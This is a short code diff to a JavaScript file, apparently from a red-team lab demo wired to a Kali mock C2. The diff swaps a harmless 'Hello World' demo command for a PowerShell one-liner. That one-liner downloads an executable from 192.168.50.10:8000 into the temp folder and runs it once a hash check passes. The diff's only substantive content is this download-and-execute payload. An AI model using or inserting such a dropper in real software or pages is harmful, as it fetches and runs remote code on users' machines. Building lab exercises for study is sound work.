@@ -94,7 +94,7 @@ document.getElementById("tokenButton").addEventListener("click", () => {
 const scenarioModal = document.getElementById("scenarioModal");
 document.getElementById("scenarioButton").addEventListener("click", () => openModal(scenarioModal));
 
-const allowedDemoCommand = 'cmd /k echo "Hello World!"';
+const allowedDemoCommand = `cmd /k echo powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash -eq '8d85636b97a74705cbc1e5ba8c46389a4a8dc4846f0a12d7edf19b9695e8be94'){&$p}else{ri $p -Force}"`;
 
 async function loadDemoCommand() {
   // Nginx의 /c2/ 경로가 Kali 모의 C2(192.168.50.10:8000)로 프록시된다.
